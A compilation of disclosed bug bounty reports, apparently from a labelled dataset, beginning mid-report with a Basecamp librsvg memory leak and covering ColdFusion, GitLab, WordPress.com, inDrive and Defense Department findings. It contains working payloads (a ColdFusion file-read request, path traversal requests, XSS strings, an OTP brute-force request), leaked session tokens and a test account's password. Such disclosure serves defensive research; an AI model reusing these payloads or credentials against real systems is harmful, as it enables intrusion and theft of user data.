+Basecamp supports uploading SVG pictures as avatars. Apparently, they are converted via an outdated librsvg version at Basecamp's servers. This version contains a vulnerability that allows leakage of the contents of an uninitialized memory block (that is, something is malloced, never initialized, and then used to build the preview image). Since it seems to be performed in the same unix process as the general request processing, it is possible for an attacker to steal sensitive data from this process, including basecamp configs (e.g., AWS keys) and requests of random users.
+Steps to reproduce
+First, you must generate an image that triggers the vulnerability. To do so, you will need Python installed. Download the attached program rsvgeb.py (F2597505) and run it like this: python3 rsvgeb.py gen 260x260 --format bmp zalupa.png (exactly like this). The result will be stored in the zalupa.png file (which is actually an SVG). The picture contains the exploit itself and carefully chosen SVG filters that make it possible to recover the original data regardless of later conversion artifacts.
+Second, upload the resulting image as your avatar. Login to your Basecamp account, go to your profile (click on the circle image at the top left corner, then go to "Profile, password, ███"), there use the "Change your avatar button" and select the zalupa.png we generated earlier. Don't forget to click on the green button "Save my changes" at the bottom of the page.
+After the avatar update, you will see the pixel image instead of the avatar. We'll use rsvgeb.py again to extract the information. However, the script uses ImageMagick to extract pixel data from PNG files, so you will need it installed locally (at the environment where the rsvgeb.py is ran). apt install imagemagick -y should be enough on Debian and Ubuntu systems.
+After installing ImageMagick, you must retrieve the public link to your avatar. To do this, click on your avatar with the right mouse button, and choose "Copy image address". After that, open the copied link in a new tab to follow the redirect. The link should change from something like ████ to something like ████████. Copy the latter one.
+while true; do curl "████$RANDOM$RANDOM$RANDOM$RANDOM.png?v=1" | python3 rsvgeb.py recover 260x260 - | strings -n 10 | tee -a pizda_hui_govno.txt; done
+Execute the command. You will see fragments of memory from some Basecamp servers that will also accumulate in pizda_hui_govno.txt. Sometimes you will see trash or parts of the original SVG, but sometimes you will see fascinating pieces of information. Keep the script running for some time so you will get more sensitive memory fragments (I ran it for 48+ hours). Inspect pizda_hui_govno.txt to check what you have.
+Impact
+Given the nature of the vulnerability, the attacker does not control which kind of information she will extract. However, due to the lack of isolation between the image converter process and the main Ruby on Rails application, the extracted info might be quite sensitive.
+Seemingly, the most exciting fragment I came across included AWS keys and looked like this:
+Code 352 Bytes
+1    ███
+2    ██████████
+3    ██████
+4    █████████
+5    -----END RSA PRIVATE KEY-----
+6
+7s3_backup:
+8  access_key_id: ██████████
+9  secret_access_key: █████
+10
+11sns:
+12  access_key_id: ███████
+13  secret_access_key: █████
+14
+15active_record_encryption:
+16  primary_key: █████████
+17  deterministic_key: █████████
+18  key_derivation_salt: █████
+19
+20new_relic:
+21  license_key: ██████
+That is, apparently, a fragment of some internal Basecamp config. Other similar configs include:
+Code 335 Bytes
+1production_s3_primary:
+2  service: S3
+3  access_key_id: ███
+4  secret_access_key: █████
+5  region: us-east-2
+6  bucket: ███
+7  upload:
+8    storage_class: INTELLIGENT_TIERING
+9
+10production_s3_replica:
+11  service: S3
+12  access_key_id: ████████
+13  secret_access_key: ███
+14  region: us-west-2
+15  bucket: ████████
+16  upload:
+17    storage_class: ONEZONE_IA
+I've checked that the keys actually work, but have not performed any post exploitation:
+Code 975 Bytes
+1$ AWS_DEFAULT_REGION=us-east-2 AWS_ACCESS_KEY_ID=████ AWS_SECRET_ACCESS_KEY=██████ aws sts get-caller-identity
+2{
+3    "UserId": "██████",
+4    "Account": "██████████",
+5    "Arn": "arn:aws:iam::██████:user/bc3-storage"
+6}
+7$ AWS_DEFAULT_REGION=us-east-2 AWS_ACCESS_KEY_ID=████████ AWS_SECRET_ACCESS_KEY=██████████ aws s3 ls s3://███/
+8                           PRE ███████/
+9                           PRE ████████/
+10                           PRE ███/
+11                           PRE ██████/
+12                           PRE █████████/
+13                           PRE ████/
+14                           PRE ███████/
+15                           PRE ███/
+16                           PRE ███/
+17                           PRE █████/
+18                           PRE █████/
+19                           PRE █████/
+20█████████ ████████ ███████
+21██████ ████████ ██████
+22██████ ████████ █████
+23██████████ ██████ ██████
+24███ █████████ ██████████
+25██████████ ███████ █████████
+26███ ███████ █████████
+27... snip ...
+Another thing that I was able to extract is fragments of queries of other users, including cookies (that is a random example):
+Code 1.17 KiB
+1X_REAL_IP: █████
+2X_FORWARDED_FOR: ████████, ███
+3HOST: ████████
+4X_QUEUE_START: 1690786808.173
+5CONNECTION: close
+6COOKIE: █████
+7█████████%██████%2BVxMClK5d1rjoLKbCyFnKab9lI2lZ9sLvGW%2BT60xsygpl6syYIfVHK73km9DT98ecq0JD68OBnI9EdzLcEdmI5%2BXr%2FuOZ5BeUMoX--kvDVySR7oaYSGdHy--RU8uCFyrq8mPCjEvyX38OA%3D%3D; _csrf_token=KHczIU3KBHe%2FJjVhpFWn48FJ2vtYha4YdwUvXdypO51h5iLa4XvkjqaX0XYtzy7fOJahGGN40mfq8GMEN0v1t0SqEnfJUY%2F7CY1mVVSs9EuAFK8wF4Wrh5jA9jk4sen8KDEDXq7sjAMjdnsLLzIjL0LYLG8P8%2FsZz2BHy95JB9JTSsyPleUI--MLV2RZiAHIJrVXv%2F--rQLRhEgWWYGfXxRmqL%2B%2Frw%3D%3D; authenticity_token=████; color_scheme=none; bc3_session_verification_token=0187762ee195d9bdbb1c; bc3_identity_id=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBCSTBqYXdFPSIsImV4cCI6bnVsbCwicHVyIjoiY29va2llLmJjM19pZGVudGl0eV9pZCJ9fQ%3D%3D--957bc8a13ea3ae13b00792f0fecaa58f046a791b
+8ACCEPT: application/json
+9X_REQUESTED_WITH: XMLHttpRequest
+10ACCEPT_LANGUAGE: de-DE,de;q=0.9
+11IF_NONE_MATCH: W/"77ae6ae7dd96d1bac74baed254a6ab62"
+12USER_AGENT: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15
+13REFERER: █████
+14X_FETCH_TYPE: native
+15X_CSRF_TOKEN: ██████████
+16X_FORWARDED_PROTO: https
+17X_FORWARDED_PORT: 443
+Also, there were some fragments of Ruby code:
+Code 750 Bytes
+1def owner_id_before_type_cast();self.attribute_before_type_cast("owner_id");end;def organization_before_type_cast();self.attribute_before_type_cast("organization");end;def about_url_before_type_cast();self.attribute_before_type_cast("about_url");end;def client_id_before_type_cast();self.attribute_before_type_cast("client_id");end;def client_secret_before_type_cast();self.attribute_before_type_cast("client_secret");end;def redirect_uri_before_type_cast();self.attribute_before_type_cast("redirect_uri");end;def trusted_before_type_cast();self.attribute_before_type_cast("trusted");end;def scope_before_type_cast();self.attribute_before_type_cast("scope");end;def signing_secret_before_type_cast();self.attribute_before_type_cast("signing_secret");
+Mitigation
+As the first and the easiest hotfix, I suggest updating the librsvg to the latest version. That will fix this particular bug.
+Another possible quick-fix option would be to forbid uploading SVG avatars or to skip preview generation for them. Note that the previews are not generated for the SVG files anywhere except the avatars (e.g., in the "Docs & Files" section); thus, exploiting librsvg issues is impossible using these endpoints.
+As a long-term solution, I suggest moving image preview generation to an isolated environment. If you would convert every image in another process inside a networkless docker, that would eliminate all the class of image converter-related issues.
+
+
+
+==================================================
+
+Report File: 743953.json
+------------------------------
+Report To: GitLab
+Severity: HIGH
+Complexity: MEDIUM
+Novelty: MEDIUM
+Multi-component: True
+Weaknesses:
+- Insecure Direct Object Reference (IDOR)
+
+Contents:
+
+Summary
+An attacker could transfer issues, merge requests of another project to the imported project by importing a crafted GitLab export.
+Steps to reproduce
+Import the attached tarball as GitLab export.
+Check the issues page of the imported project. You will see an private issue created by https://gitlab.com/nyangawa-h1 instead of the current user.
+Description
+The exploit is in project.json, I added one line to assign issue_ids and kept issues an empty array.
+Code 99 Bytes
+1    "issue_ids": [ 27422144 ],                                                 
+2    "issues": [],  
+The issues_ids contains the database id of the issues the attacker wants to steal. There's no good way for the attacker to know the id of a specific issue, but as the id is incremental, the attacker could simply steal as many issues as possible in a brute forcing manner.
+The root cause of this issue lies in project_tree_restorer.rb
+Code 50 Bytes
+1...
+2@project.assign_attributes(project_params)
+3...
+Many attributes (foreign key) like issue_ids and merge_request_ids are not excluded during import. According to my observation, affected objects including (but not limited to):
+Code 50 Bytes
+1board_ids
+2issue_ids
+3merge_request_ids
+4note_ids
+5...
+Looks like almost all non-excluded attributes behaves like issues are affected.
+Examples
+<image_0>
+Output of checks
+This bug happens on GitLab.com and self-hosted GitLab installations.
+Impact
+With this ability to modify relations between objects, an attacker could end up with accessing random resources of other users by traversing the incremental ID space.
+
+
+
+==================================================
+
+Report File: 1290872.json
+------------------------------
+Report To: Twitter Algorithmic Bias
+Severity: HIGH
+Complexity: MEDIUM
+Novelty: MEDIUM
+Multi-component: True
+Weaknesses:
+- Improper Input Validation
+
+Contents:
+
+Bounty Hunter Name:
+CyberQueenMeg
+About You:
+Megan, also known as CyberQueenMeg, is a passionate rising cybersecurity professional who is interested in programming, cybersecurity, and web development. Megan is a high school senior in a rigorous computer science program at her high school where she has to take an advanced CS course every year and complete a 200-hour internship. Megan founded the Computer Science Club at her school, which is committed to providing CS education to all in a safe learning environment. Megan works as a freelance bug bounty hunter for HackerOne and Bugcrowd and is particularly focused on hunting for web security vulnerabilities. Megan is a nationally recognized cybersecurity scholar and has earned industry-recognized certifications through ETA and Microsoft. Megan is a 2021 National Cyber Scholar, 2021 NCWIT National Honorable Mention, and a member of a SkillsUSA top 5 team in cybersecurity. As a female student in technology, Megan also shares her perspective on cybersecurity and diversity in technology with audiences worldwide. Megan is also a member in good standing in many national organizations, including NCWIT, WiCyS, ETA International, SkillsUSA, CyberPatriot, NHS, and CSHS. After graduating high school in May 2022, Megan plans to attend Grand Canyon University in Phoenix, Arizona to earn a Bachelor of Science in Cybersecurity. Megan is also an avid violinist, pianist, and guitarist and is the concertmaster of her school orchestra. When Megan is not working, she enjoys competing in CTFs, reading, baking, playing music, geocaching, and being with her family and friends.
+ReadMe:
+The category I am submitting my crop bias bounty for is Economic Harm. As defined in the bounty rules, a submission that qualifies as a cropped photo that could cause economic harm is one that 'reduced customers, profits or growth'
+The example I am providing here is a post by a small business owner advertising the book she is selling. The beginning of the website URL to buy the book is cropped out in the photo. The saliency was focused on the dog on the graphic cover and not on the text displaying crucial information on how to order a book.
+Because of this unfortunate cropping, if readers are just looking at the photo and not clicking on it or reading the post, the readers will not be impressed by the graphic in the post because of the poor cropping cutting off part of the words and website. Most people blame the account owner for this unappealing appearance when the problem could be solved by moving the saliency model to the center of a bit of text if it contains a bit of text that looks like a URL.
+In addition, the customers do not have all of the information they need to make a purchase from this graphic in this crop mode because the beginning of the website URL is cut off. This causes a reduction in profits and customers for this small business owner and therefore qualifies as an Economic Harm Bounty in the Twitter Crop Algorithm Bias bug bounty submission.
+This issue needs to be fixed because when small business owners use Twitter to advertise, they often put crucial information in their graphics that need to be put front and center. Without a fix, many business owners will lose potential customers and products that could greatly improve their financial position. This type of bug occurs many times a day with customers that post text-based graphics, further emphasizing the need for a fix. Because of this, countless Twitter users are exposed to this error every day. Furthermore, this is an unintentional user that can not be fixed by the account owner but is caused entirely by the AI algorithm.
+Evidence/Reproducibility:
+This GitHub link contains the original graphic and the cropped graphic I used as my bounty example; https://github.com/mhowell11/twitter-crop-bias-bounty
+Supporting Material/References:
+All supporting material is contained in the GitHub link in Evidence/Reproducibility
+Impact
+Self-Grading Recommendation:
+Description of Harm
+Decision to grade as intentional or unintentional harm: This is an unintentional harm because end users who post a graphic have no control over how it is cropped and can not change it if crucial text about a product is cut off. Therefore, this bias starts off with 8 points.
+-Harm Base Score: 8
+- Harm Damage/Impact: 1.2: This error does not affect any marginalized communities in particular, but business owners have a moderate impact because crucial information about their product is being cut away in favor of other items in the graphic.
+- Affected Users: 1.3: This error affects all users who use Twitter because business owners have a difficult time getting users to learn about a product just through hooking them in the graphic and end users who briefly look at tweets to see if they are interested move on because of the poor formatting of the graphic.
+- Likelihood: 1.3: This error is very likely to occur and occurs every day on Twitter.
+- Justification: 1.5 I provided a specific example where it is evident that the algorithm focused on the dog instead of the text. I also explained a possible fix to the solution.
+- Clarity: 1.25 I was clear but since this is not a culturally based submission, I did not give myself a 1.5.
+- Creativity: 1.5 I believe that my submission is very creative as it is taking a stance on the issue that is focused on determining what is important to show (text in graphics that is identified as sales content) instead of what is being shown and what is not being shown.
+- Total Score: 51.6
+
+
+
+==================================================
+
+Report File: 1110229.json
+------------------------------
+Report To: DuckDuckGo
+Severity: HIGH
+Complexity: MEDIUM
+Novelty: MEDIUM
+Multi-component: True
+Weaknesses:
+- Cross-site Scripting (XSS) - Reflected
+
+Contents:
+
+Hi DuckDuckGo,
+While browsing normally (since I use DuckDuckGo on a daily basis), I discovered an interesting stored XSS on the duckduckgo main search engine. A payload that somebody had left on urbandictionary.com had triggered a HTML injection, and a stored XSS as a result.
+Steps to Reproduce
+Search the following in the searchbar of DuckDuckGo: urban dictionary "><img src=x<
+A payload left by someone else will render itself and fire in the main DuckDuckGo page.
+It is also possible to visit the page via the DuckDuckGo URL as such and the XSS will trigger.
+POC
+The page itself renders HTML. The payload fires.
+<image_0>
+<image_1>
+Impact
+There are several impacts here.
+Firstly, the DuckDuckGo URL serves as a payload, because simply visiting the page with the right search parameter triggers the XSS, although the search parameters themselves do not directly trigger it.
+Secondly, the XSS is stored in the search results, so this can be considered to be Stored XSS.
+It is possible to execute any Javascript via the main DuckDuckGo page.
+If you have any questions or require clarification, I am happy to help.
+Cheers,
+PMOC
+
+
+
+==================================================
+
+Report File: 2248781.json
+------------------------------
+Report To: U.S. Dept Of Defense
+Severity: HIGH
+Complexity: MEDIUM
+Novelty: MEDIUM
+Multi-component: True
+Weaknesses:
+- Improper Access Control - Generic
+
+Contents:
+
+Unauthenticated Arbitrary File Read vulnerability due to de serialization of untrusted data in Adobe ColdFusion.
+Impact
+The impact of this vulnerability could result in unauthorized access to sensitive data and actions within the affected Adobe ColdFusion instances.
+System Host(s)
+█████████
+Affected Product(s) and Version(s)
+The vulnerability affects ColdFusion 2021 Update 5 and earlier as well as ColdFusion 2018 Update 15 and earlier
+CVE Numbers
+CVE-2023-26360
+Steps to Reproduce
+POST /cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/iedit.cfc?method=wizardHash&_cfclient=true&returnFormat=wddx&inPassword=foo HTTP/1.1
+Host: ███
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
+Connection: close
+Content-Length: 121
+Content-Type: application/x-www-form-urlencoded
+Accept-Encoding: gzip, deflate, br
+_variables=%7b%22_metadata%22%3a%7b%22classname%22%3a%22i/../lib/password.properties%22%7d%2c%22_variables%22%3a%5b%5d%7d
+Password hash is disclosed in the response:
+Suggested Mitigation/Remediation Actions
+Apply the necessary security patches or updates provided by Adobe to fix the vulnerability.
+
+
+
+==================================================
+
+Report File: 1040047.json
+------------------------------
+Report To: Automattic
+Severity: HIGH
+Complexity: MEDIUM
+Novelty: MEDIUM
+Multi-component: True
+Weaknesses:
+- Violation of Secure Design Principles
+
+Contents:
+
+Summary:
+This bug is related to wordpress.com. There is feature in wordpress.com which allow users to invite people. We have to enter email address to invite that particular person but the invite link and invite key is also available to the person who invited. This allow attackers to create the profile without having access to the email address and they can make account on behalf of any people who is not already signed up in wordpress.com
+Platform(s) Affected:
+wordpress.com
+public-api.wordpress.com
+Steps To Reproduce:
+This issue can be reproduced by following these easy steps:
+Login to your account on wordpress.com
+Setup burpsuite proxy with browser.
+Select your site and navigate to manage>people
+Enter any email address which is not already registered in wordpress.com and invite
+Open this url in browser: https://wordpress.com/people/invites/yoursite.wordpress.com [change yoursite.wordpress.com with your site]
+See the burp suite proxy tab and find the GET request to this endpoint [https://public-api.wordpress.com/rest/v1.1/sites/siteId_here/invites?http_envelope=1&status=all&number=100][there will be a number instead of siteId_here]
+In response of this GET request you will see JSON which will be consisting of the details about the invitations sent and there you will find "invite_key" and "link".
+Copy the link and open this in another browser.
+You can create account on behalf of this email without having access to the email and email verification is bypassed :)
+See the attached video for POC
+Mitigation:
+This is the pure violation of secure design principles, this can be mitigated by just removing the [invite_key] and [link] from the response in [https://public-api.wordpress.com/rest/v1.1/sites/siteId_here/invites?http_envelope=1&status=all&number=100]. Because this invite key and link is the property of the person being invited, showing these creds to other people will result this type of issue.
+Impact
+This issue can be used to bypass email verification on signup. Attackers can create account on behalf on any person without having access to the email account. This issue is affecting integrity of the wordpress.com
+
+
+
+==================================================
+
+Report File: 904064.json
+------------------------------
+Report To: U.S. Dept Of Defense
+Severity: HIGH
+Complexity: MEDIUM
+Novelty: MEDIUM
+Multi-component: True
+Weaknesses:
+- Code Injection
+
+Contents:
+
+Summary:
+An attacker is able to share their dashboard with other █████████ users. When sharing their dashboard, the message is not fully sanitized for HTML characters before sending to the recipient. This allows the attacker to craft a believable spearphishing e-mail coming from an e-mail address owned by the ███████.
+Step-by-step Reproduction Instructions
+Create an account or sign into ██████.
+Browse to ███████/█████
+Create a dashboard by clicking the dropdown menu and selecting New Dashboard. ████
+Once you create the dashboard, go back to ███/██████ and select the dashboard you created.
+You should see a share icon in the top right. Click this and click Add groups and users. ███
+If you start typing in the To: field, a list of names should populate. Select the name of an account you own. █████████
+Check the Send an email invitation box. Populate the Message field with your spearphishing attempt (this can contain various HTML elements) and click Share. ██████
+The victim will receive an e-mail from ██████████ with the injected HTML. As you can see below, the <img> tag did not work correctly but the other formatting seemed to work fine. This allows the adversary to get very creative.. ██████████ Note: the message above says "...shared with you by unagi unagi.", however an attacker could simply sign up with a first/last name of "████████" or something similar to make this more believable.
+Suggested Mitigation/Remediation Actions
+Sanitize all HTML tags prior to sending the e-mail to the recipient.
+Impact
+An adversary could conduct a spearphishing campaign from an ██████ mail server - the scale of effects would be dependent on the creativity of the attacker and the gullibility of the victim.
+
+
+
+==================================================
+
+Report File: 1195340.json
+------------------------------
+Report To: Reddit
+Severity: HIGH
+Complexity: MEDIUM
+Novelty: MEDIUM
+Multi-component: True
+Weaknesses:
+- Weak Cryptography for Passwords
+
+Contents:
+
+By using BruteForce with random passwords, we have succedded the account
+Impact
+Account can be taken out
+
+
+
+==================================================
+
+Report File: 1457928.json
+------------------------------
+Report To: U.S. Dept Of Defense
+Severity: HIGH
+Complexity: MEDIUM
+Novelty: LOW
+Multi-component: True
+Weaknesses:
+- Security Through Obscurity
+
+Contents:
+
+I have found a subdomain of ███████ to be vulnerable to takeovers via a CNAME to unclaimed domain. I have claimed this domain and redirected them to a blank page to prevent a bad actor from doing so in the meantime, and hosted a POC file at obscure URLs. These are the following domains I discovered and the outdated endpoints on Azure to which they point:
+█████ --> ████
+...and the proof-of-concept file is at the following location:
+https://████████/proof.e7437329-ab61-4f22-a049-df5b3685313a.txt
+I have not hosted any other file nor attempted any other vector of attack.
+Impact
+You're probably familiar with takeovers like this by now, but through this vulnerability, it would be possible for an attacker to obtain cookies and other sensitive information from your users via phishing, cookie hijacking, or XSS.
+More info on possible attack vectors can be found at MDN: https://developer.mozilla.org/en-US/docs/Web/Security/Subdomain_takeovers
+System Host(s)
+████
+Affected Product(s) and Version(s)
+CVE Numbers
+Steps to Reproduce
+To confirm the issue visit:
+https://████████/proof.e7437329-ab61-4f22-a049-df5b3685313a.txt
+Suggested Mitigation/Remediation Actions
+Remove CNAME of █████
+
+
+
+==================================================
+
+
+LOW/MEDIUM COMPLEXITY/NOVELTY SINGLE-COMPONENT REPORTS
+==================================================
+
+Total reports in group: 493
+Selected reports: 15
+
+Report File: 487008.json
+------------------------------
+Report To: Flickr
+Severity: HIGH
+Complexity: MEDIUM
+Novelty: MEDIUM
+Multi-component: False
+Weaknesses:
+- Code Injection
+
+Contents:
+
+Summary: FFmpeg is a video and audio software that is used for generating previews and for converting videos. Your current installation allows HLS playlists that contain references to external files, which leads to local file disclosure.
+Steps to Reproduce:
+1.Download the attached file. READ__etc_passwd.avi (F413554)
+2.Go to https://www.flickr.com/photos/upload/ and upload the attached file.
+<image_0>
+Please let me know if you need any help :)
+Impact
+An attacker can read files of etc/passwd or other contents.Also what I've seen it is possible to escalate this vulnerability to SSRF(https://www.blackhat.com/docs/us-16/materials/us-16-Ermishkin-Viral-Video-Exploiting-Ssrf-In-Video-Converters.pdf).Since I don't have any server I couldn't test :(
+
+
+
+==================================================
+
+Report File: 1991376.json
+------------------------------
+Report To: inDrive
+Severity: HIGH
+Complexity: LOW
+Novelty: LOW
+Multi-component: False
+Weaknesses:
+- Business Logic Errors
+
+Contents:
+
+Summary:
+Find the mobile phone number of the administrator through the WHOIS information, and then send the verification code. Assuming that the verification code expires for 30 seconds or 1 minute, we can only explode the correct verification code in a short time to log in to the management system, so I choose to blast The verification code between 6000 and 7000, and sends the verification code every time it blasts, knows that the correct verification code is found, and I only exploded 8 times to find the correct verification code
+Steps To Reproduce:
+Find the management address through the directory scanning:https://truck-admin.eu-east-1.indriverapp.com/admin/auth
+Find the administrator's mobile phone number through WHOIS information:████████
+Send the verification code through the mobile phone number, you will receive a four -digit verification code
+Enter the four-digit verification code to log in and use Burpsuite to grab the package, blast the verification code and set the range of the verification code to 6000-7000, and the thread is set to 20 to ensure that the correct verification code can be blasting within 30 seconds within 30 seconds ██████████
+request:
+Code 823 Bytes
+1POST /proxy/truck/api/admin/login HTTP/2
+2Host: truck-admin.eu-east-1.indriverapp.com
+3Cookie: _gcl_au=1.1.354145541.1684380001; _ga=GA1.1.1412822094.1684380001; _ga_YBFM6LW448=GS1.1.1684382089.2.1.1684382341.58.0.0
+4Content-Length: 37
+5Sec-Ch-Ua: "Chromium";v="21", " Not;A Brand";v="99"
+6Accept: application/json, text/plain, */*
+7Content-Type: application/json
+8Sec-Ch-Ua-Mobile: ?0
+9User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
+10Sec-Ch-Ua-Platform: "Windows"
+11Origin: https://truck-admin.eu-east-1.indriverapp.com
+12Sec-Fetch-Site: same-origin
+13Sec-Fetch-Mode: cors
+14Sec-Fetch-Dest: empty
+15Referer: https://truck-admin.eu-east-1.indriverapp.com/admin/auth
+16Accept-Encoding: gzip, deflate
+17Accept-Language: zh-CN,zh;q=0.9
+18
+19{"phone":"██████","code":"1234"}
+Burp Settings:
+█████████████
+5. Repeat 3,4 steps until the correct verification code is exploded
+██████
+6. Add the cookie obtained in the fifth step to the request header and access https://truck-admin.eu-east-1.indriverapp.com/admin/order,and then enter the management system
+██████████
+█████████
+Supporting Material/References:
+[attachment / reference]
+████
+████
+███
+Impact
+Can get detailed information from all drivers and customers of the entire platform, including the driver's model license plate number, and customer taxi order records, taxi records include license plates/taxi position/reaching location, etc.
+
+
+
+==================================================
+
+Report File: 2518407.json
+------------------------------
+Report To: U.S. Dept Of Defense
+Severity: HIGH
+Complexity: LOW
+Novelty: LOW
+Multi-component: False
+Weaknesses:
+- Improper Access Control - Generic
+
+Contents:
+
+Description:
+Adobe ColdFusion versions 2023.5 (and earlier) and 2021.11 (and earlier) are affected by an Improper Access Control vulnerability that could result in a Security feature bypass. An unauthenticated attacker could leverage this vulnerability to access the administration CFM and CFC endpoints.
+References
+https://nvd.nist.gov/vuln/detail/CVE-2023-26347
+https://vuldb.com/?id.245747
+Impact
+An attacker, without authentication, could exploit this vulnerability to gain access to the administration CFM and CFC endpoints.
+System Host(s)
+██████████.mil
+Affected Product(s) and Version(s)
+https://█████.mil/hax/..CFIDE/adminapi/administrator.cfc?method=getBuildNumber&_cfclient=true
+CVE Numbers
+CVE-2023-26347
+Steps to Reproduce
+Access to the https://████████.mil/hax/..CFIDE/adminapi/administrator.cfc?method=getBuildNumber&_cfclient=true site.
+Suggested Mitigation/Remediation Actions
+Check the Release Note and upgrade the version of Adobe ColdFusion product
+
+
+
+==================================================
+
+Report File: 497771.json
+------------------------------
+Report To: U.S. Dept Of Defense
+Severity: HIGH
+Complexity: MEDIUM
+Novelty: LOW
+Multi-component: False
+Weaknesses:
+- Path Traversal
+
+Contents:
+
+Description
+Hello. I discovered a Path Traversal issue on the https://██████████/
+I was able to turn it to the local file read, and after series of the test determined that it's possible to reach sensitive system files with administrator rights.
+POC
+The next request will read the c:/windows/System32/drivers/etc/hosts as POC:
+Code 357 Bytes
+1GET /gwtmain//..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fwindows/System32/drivers/etc/hosts HTTP/1.1
+2Host: ██████████
+3Accept-Encoding: gzip, deflate
+4Accept: */*
+5Accept-Language: en
+6User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+7Connection: close
+8
+9
+██████████
+In browser (Chrome):
+Code 171 Bytes
+1https://███████/gwtmain//..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fwindows/System32/drivers/etc/hosts
+Testing if we have admin rights:
+Code 346 Bytes
+1GET /gwtmain//..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fUsers/Administrator/NTUser.dat HTTP/1.1
+2Host: ████
+3Accept-Encoding: gzip, deflate
+4Accept: */*
+5Accept-Language: en
+6User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+7Connection: close
+8
+The system will return 200 ok and respond with content of Users/Administrator/NTUser.dat which should be accessible only from administrator account.
+██████
+It proves the critical impact an possibility of the RCE, because we have high-privileged rights on the system.
+Suggested fix
+Secure the vulnerable servlet.
+Impact
+Remote attacker is able to read any file on the system partition, it can lead to the full compromise of the resource, in case attacker will reach sensitive files such as logs/credentials/registry tree.
+
+
+
+==================================================
+
+Report File: 1054526.json
+------------------------------
+Report To: Automattic
+Severity: HIGH
+Complexity: MEDIUM
+Novelty: MEDIUM
+Multi-component: False
+Weaknesses:
+- Cross-site Scripting (XSS) - Stored
+
+Contents:
+
+Summary:
+Hello Team,
+I found the Stored XSS vulnerability in the Custom Style section, this vulnerability can result in an attacker to execute arbitrary JavaScript in the context of the attacked website and the attacked user. This can be abused to steal session cookies, performing requests in the name of the victim or for phishing attacks, by inviting the victim to become part of the manager or administrator.
+Platform(s) Affected:
+wordpress.com
+Steps To Reproduce:
+As an attacker, go to the feedback section, then go to the Polling section.
+Add a new post or edit an existing post.
+Scroll down, click All Styles.
+Add a new Style.
+Named the temporary style, click Save Style.
+Change the Style Name with <noscript><p title= "</noscript><img src=x onerror=alert(document.cookie)>">, check the checkbox next to Save Style, click Save Style.
+Script will be run.
+Invite the victim in a way, go to manage then users.
+Click invite, enter username or email, and send.
+As a Victim, accept the attacker's invitation.
+Go to the Feedback section.
+Then go to the Polling section.
+Add a new post or edit an existing post.
+Scroll down, click All Styles.
+Enter the Style that has been created by the previous Attacker.
+Script will be run.
+Supporting Material/References:
+Screenshot_(538).png (F1109567)
+Screenshot_(539).png (F1109568)
+2020-12-09_08-24-14.mp4 (F1109569)
+Impact
+this vulnerability can result in an attacker to execute arbitrary JavaScript in the context of the attacked website and the attacked user. This can be abused to steal session cookies, performing requests in the name of the victim or for phishing attacks, by inviting the victim to become part of the manager or administrator.
+
+
+
+==================================================
+
+Report File: 293105.json
+------------------------------
+Report To: ok.ru
+Severity: HIGH
+Complexity: LOW
+Novelty: LOW
+Multi-component: False
+Weaknesses:
+- None
+
+Contents:
+
+Доброго времени суток. Я нашел XSS в личных сообщениях.
+Поле, где юзер набирает сообщения не фильтруется. Туда можно встроить скрипт, используя багу, которую я описывал раньше. Пишем сообщение и у друга срабатывает XSS.
+Вы исправили возможность пилить ники, содержащие специальные символы через мобильную версию, но у меня осталось парочка. Прошу заметить, что у других людей и злоумышленников также могли остаться такие ники.
+Пример аккаунта вам для тестов:
+79601920522
+90177715q
+Прошу не блокировать. Данные аккаунты сейчас на вес - золото.
+<image_0>
+Еще скрин:
+<image_1>
+██████████
+Спасибо.
+Impact
+Злоумышленник может заюзать XSS.
+
+
+
+==================================================
+
+Report File: 867436.json
+------------------------------
+Report To: BTFS
+Severity: HIGH
+Complexity: MEDIUM
+Novelty: MEDIUM
+Multi-component: False
+Weaknesses:
+- Misconfiguration
+
+Contents:
+
+Hello team,
+I found a bug on your website that let me bypass the SOP policy.
+Hope you fix it, everything is in the video
+https://www.youtube.com/watch?v=PYsU350S-s4
+Impact
+The attacker my direct a victim to a phishing page of www.bitterrent.com/login and he/she will be convince to enter their email and password or even hijack csrf-token and sending him a password or email reset link.
+I also found a link that expose the csrf-token on the URL and you should check this link in the black.svg host header URL
+
+
+
+==================================================
+
+Report File: 170552.json
+------------------------------
+Report To: HackerOne
+Severity: HIGH
+Complexity: MEDIUM
+Novelty: MEDIUM
+Multi-component: False
+Weaknesses:
+- Cross-Site Request Forgery (CSRF)
+
+Contents:
+
+Details:
+Summary:
+Cross-site Request Forgery in the Integrations (https://hackerone.com/[YOUR_TEAM]/integrations) feature for teams.
+Description (Include Impact):
+The Integrations flow is insecure, because it can be abused by CSRF.
+PoC:
+Request
+Code 45 Bytes
+1GET https://hackerone.com/auth/slack HTTP/1.1
+Response
+Code 245 Bytes
+1Location: https://slack.com/oauth/authorize
+2?client_id=2174110321.11522100978
+3&redirect_uri=https%3A%2F%2Fhackerone.com%2Fauth%2Fslack%2Fcallback
+4&response_type=code
+5&scope=incoming-webhook
+6&state=379fd8f1baa8d80516e2f706f025057ad0ce2cca0bbbd56c
+How can it be bad since you are using state parameter?
+You are trusting in third-party security that is not under your control.
+All the attacker needs is an XSS or Login CSRF or Clickjacking in the third-party system and he can compromise your system. With one of the previous mentioned vulnerabilities in the third-party system, the attacker can control the entire OAuth flow and connect his own accounts to the victim's HackerOne account.
+Today, you have just one integration available (Slack).
